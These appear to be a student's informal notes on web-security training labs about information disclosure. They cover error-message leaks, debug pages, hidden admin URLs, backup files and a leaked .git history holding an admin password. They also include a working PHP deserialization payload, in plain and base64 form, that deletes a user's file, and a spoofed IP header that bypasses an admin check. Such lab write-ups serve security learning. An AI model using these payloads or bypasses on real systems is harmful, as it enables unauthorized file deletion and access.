- Sensitive data can be leaked in all kinds of places, so it is important not to miss anything that could be useful later. You will often find sensitive data while testing for something else. A key skill is being able to recognize interesting information whenever and wherever you do come across it.
- 

# Information disclosure in error messages
```
GET /product?productId=2 HTTP/1.1
```
`/product?productId=` 20+ -> notfond

`/product?productId=kurohat` -> error messege disclosure service version `Apache Struts 2 2.3.31`

# Information disclosure on debug page
burp suite -> site map. looks for something juicy. key is in /cgi-bin/phpinfo.php

# Lab: Unprotected admin functionality with unpredictable URL
```js
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-jnwti1');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
```

# Lab: User ID controlled by request parameter with data leakage in redirect 
 This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can access you own account using `wiener:peter`. 


# Source code disclosure via backup files
- robots.txt -> /backup -> .bak -> database password
  
# Lab: Arbitrary object injection in PHP
This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can access your own account using the following credentials: wiener:peter 

You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. 

- index
```html
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```
- `/libs/CustomTemplate.php~`
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
so unlink in php is — Deletes a file

try to intercept with burp suit and I found that the cookie looks wiredly long so I use **Chef** to check it
check session cookie:
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4VXNTSlNDUE5HemVGWURPTEthSWNoVEdvOTRwZm1UaiI7fQ%3d%3d
```
decode base64
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xUsSJSCPNGzeFYDOLKaIchTGo94pfmTj";}
ÝÝ
```
so The plan is we will replace the cookie with our payload: CustomTemplate, lock_file_path, /home/carlos/morale.txt. use `wc -m` to count word
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
now encode it in base64
```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```
now replace with the cookie and send it to server. boom!

# authen
TRACE /admin

X-Custom-IP-Authorization: 5.57.245.197

only local user -> X-Custom-IP-Authorization: 127.0.0.1

# las lab
`.git`
- config:
```
[user]
	email = carlos@evil-user.net
	name = Carlos Montoya
```
- log
```
0000000000000000000000000000000000000000 ae1caf1716bd5f4d0e2cbd15cf47204073ca372c Carlos Montoya <carlos@evil-user.net> 1600445061 +0000	commit (initial): Add skeleton admin panel
ae1caf1716bd5f4d0e2cbd15cf47204073ca372c d6c877b4b616275169fb98652af64ba08a0dd112 Carlos Montoya <carlos@evil-user.net> 1600445061 +0000	commit: Remove admin password from config
```
okey let use gitdump and dump .git
```console
/Desktop/git/.git$ git log
commit d6c877b4b616275169fb98652af64ba08a0dd112 (HEAD -> master)
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit ae1caf1716bd5f4d0e2cbd15cf47204073ca372c
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
kali@kali:~/Desktop/git/.git$ git show ae1caf1716bd5f4d0e2cbd15cf47204073ca372c
commit ae1caf1716bd5f4d0e2cbd15cf47204073ca372c
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel

diff --git a/admin.conf b/admin.conf
new file mode 100644
index 0000000..273400a
--- /dev/null
+++ b/admin.conf
@@ -0,0 +1 @@
+ADMIN_PASSWORD=upga15px9x3q7dleogbj
diff --git a/admin_panel.php b/admin_panel.php
new file mode 100644
index 0000000..8944e3b
--- /dev/null
+++ b/admin_panel.php
@@ -0,0 +1 @@
+<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
```